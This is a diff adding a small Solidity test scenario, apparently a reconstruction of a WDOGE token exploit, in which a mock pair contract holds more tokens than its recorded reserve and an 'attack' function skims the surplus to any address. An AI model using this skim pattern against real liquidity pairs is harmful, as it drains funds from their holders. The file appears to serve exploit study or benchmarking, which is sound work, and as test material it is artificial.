@@ -1,0 +1,4 @@
+pragma solidity 0.8.17;
+import {WDOGE} from "./WDOGE.sol";
+contract PairMock { WDOGE public token; uint256 public reserve; constructor(WDOGE t,uint256 r){token=t;reserve=r;} function skim(address to) external {uint256 b=token.balanceOf(address(this)); require(b>reserve); token.transfer(to,b-reserve);} function reserveBalance() external view returns(uint256){return reserve;} }
+contract Scenario { WDOGE public token; PairMock public pair; address public victim; constructor(){token=new WDOGE();pair=new PairMock(token,800 ether);victim=address(pair);token.transfer(address(pair),1000 ether);} function attack(address to) external {pair.skim(to);} function victimBalance() external view returns(uint256){return token.balanceOf(victim);} function reserveBalance() external view returns(uint256){return pair.reserveBalance();} function asset() external view returns(address){return address(token);} }
